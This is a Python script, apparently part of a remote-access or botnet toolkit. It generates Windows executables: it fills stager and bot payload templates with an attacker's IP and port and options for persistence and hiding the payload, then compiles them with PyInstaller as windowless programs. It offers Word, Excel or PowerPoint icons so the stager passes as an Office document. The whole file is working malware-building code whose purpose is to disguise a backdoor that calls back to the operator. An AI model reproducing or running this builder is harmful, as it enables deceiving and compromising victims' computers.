# Date: 09/01/2018
# Author: Pure-L0G1C
# Description: Execute creator

import os
import sys
import zlib
import shlex
import shutil
import smtplib
import tempfile

import const

from lib.file import File
from lib.args import Args

try:
    from PyInstaller import __main__ as pyi, is_win
except:
    print('Please install Pyinstaller: pip install pyinstaller')
    sys.exit(1)


class Executor(object):

    def __init__(self, ip, port, filename, wait, icon, hide, persist):
        self.ip = ip
        self.port = port
        self.hide = hide
        self.wait = wait
        self.binary = b''
        self.persist = persist
        self.filename = filename
        self.icon = shlex.quote(icon)

        self.output_dir = 'output'
        self.tmp_dir = tempfile.mkdtemp()
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        self.output_dir = 'output'
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        # Stager
        self.stager_template = os.path.join('bot', 'template_stager.py')
        self.stager_py_temp = os.path.join('bot', filename + '.py')
        self.stager_compiled = os.path.join(self.dist_path, filename + '.exe')

        # Payload
        self.bot_template = os.path.join('bot', 'template_payload.py')

        payload_name = os.path.splitext(
            os.path.basename(const.PAYLOAD_PATH))[0]

        self.bot_py_temp = os.path.join('bot', payload_name + '.py')
        self.bot_compiled = os.path.join(
            self.dist_path,  payload_name + '.exe')

    def replace(self, data, _dict):
        for k in _dict:
            data = data.replace(k, _dict[k])
        return data

    def compile_file(self, path):
        path = os.path.abspath(path)

        build_path = os.path.join(self.tmp_dir, 'build')
        cmd = 'pyinstaller -y -F -w -i {} {}'.format(
            self.icon, shlex.quote(path))

        sys.argv = shlex.split(cmd) + ['--distpath', self.dist_path] + \
            ['--workpath', build_path] + ['--specpath', self.tmp_dir]

        pyi.run()

    def write_template(self, template, py_temp, _dict):
        data = ''
        for _data in File.read(template, False):
            data += _data

        File.write(py_temp, self.replace(data, _dict))
        self.compile_file(py_temp)

    def compile_stager(self):
        args = {
            'addr_ip': repr(self.ip),
            'addr_port': str(self.port),
            'block_size': repr(const.BLOCK_SIZE),
            'stager_code': repr(const.STAGER_CODE),
            'output_file': repr(self.filename + '_.exe'),
            'hide_payload': str(self.hide),
        }

        self.write_template(self.stager_template, self.stager_py_temp, args)
        self.move_file(self.stager_compiled, self.output_dir)

    def compile_bot(self):
        args = {
            'addr_ip': repr(self.ip),
            'addr_port': str(self.port),
            'wait_time': str(self.wait),
            'auto_persist': repr(self.persist)
        }

        self.write_template(self.bot_template, self.bot_py_temp, args)

        payload_output = os.path.dirname(const.PAYLOAD_PATH)
        self.move_file(self.bot_compiled, payload_output)

    def move_file(self, file, output_dir):
        file = os.path.basename(file)
        _path = os.path.join(output_dir, file)

        if not os.path.exists(output_dir):
            os.mkdir(output_dir)

        if os.path.exists(_path):
            os.remove(_path)

        path = os.path.join(self.dist_path, file)
        shutil.move(path, output_dir)

    def start(self):
        self.compile_bot()
        self.compile_stager()
        self.clean_up()

    def clean_up(self):
        shutil.rmtree(self.tmp_dir)
        os.remove(self.bot_py_temp)
        os.remove(self.stager_py_temp)


if __name__ == '__main__':
    args = Args()
    if args.set_args():
        if not args.icon:
            icons = {
                1: 'icons/wordicon.ico',
                2: 'icons/excelicon.ico',
                3: 'icons/ppticon.ico'
            }

            option = input(
                '\n\n1) MS Word\n2) MS Excel\n3) MS Powerpoint\n\nSelect an icon option: ')

            if not option.isdigit():
                args.icon = icons[1]
            elif int(option) > 3 or int(option) < 1:
                args.icon = icons[1]
            else:
                args.icon = icons[int(option)]

            args.icon = os.path.abspath(args.icon)

        executor = Executor(args.ip, args.port, args.name,
                            args.wait, args.icon, args.hide, args.persist)

        executor.start()
        os.system('cls' if is_win else 'clear')
        print('\nFinished generating {}'.format(executor.filename + '.exe'))
        print('Look in the directory named \'output\' for your exe file')
